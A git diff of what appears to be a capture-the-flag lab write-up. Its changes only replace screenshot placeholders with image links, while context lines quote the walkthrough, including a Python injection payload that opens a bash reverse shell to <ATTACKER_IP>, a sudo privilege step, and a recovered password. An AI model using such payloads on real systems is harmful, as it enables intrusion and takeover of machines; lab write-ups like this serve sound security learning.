@@ -167,7 +167,7 @@ nc -lvnp 4444
 __import__('os').system("bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'")#
 ```
 
-[SCREEN01]
+<img width="632" height="522" alt="SCREEN01" src="https://github.com/user-attachments/assets/2f9113df-8a7d-4cc8-a6d8-0d4e4def287b" />
 
 5. After the shell is received, read the first flag.
 
@@ -175,7 +175,7 @@ __import__('os').system("bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%26
 cat flag1.txt
 ```
 
-[SCREEN02]
+<img width="349" height="156" alt="SCREEN02" src="https://github.com/user-attachments/assets/e80814b7-0d25-46a0-a876-c4924c4f9b65" />
 
 ---
 
@@ -254,13 +254,13 @@ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
 
 This yields: `supersecretkeyxorxorsupersec`
 
-[SCREEN03]
+<img width="1536" height="530" alt="SCREEN03" src="https://github.com/user-attachments/assets/8ea3e365-bb25-49c7-831e-5a5753a552c5" />
 
 6. Use that decoded key to decrypt the string from `note`.
 
 That returns the password: `G0th@mR0ckz!`
 
-[SCREEN04]
+<img width="1536" height="529" alt="SCREEN04" src="https://github.com/user-attachments/assets/3bc8b287-890c-4e24-a825-2ca2fa5b6dfc" />
 
 7. Switch user to `gordon` and read the second flag.
 
@@ -271,7 +271,7 @@ cd
 cat flag2.txt
 ```
 
-[SCREEN05]
+<img width="353" height="138" alt="SCREEN05" src="https://github.com/user-attachments/assets/bd9601b6-1e0c-494b-8867-da5600b926f5" />
 
 ---
 
@@ -339,4 +339,4 @@ Explanation:
 cat /root/root.txt
 ```
 
-[SCREEN06]
+<img width="508" height="154" alt="SCREEN06" src="https://github.com/user-attachments/assets/a036e038-4c2d-4984-9c60-edfcff7853a6" />
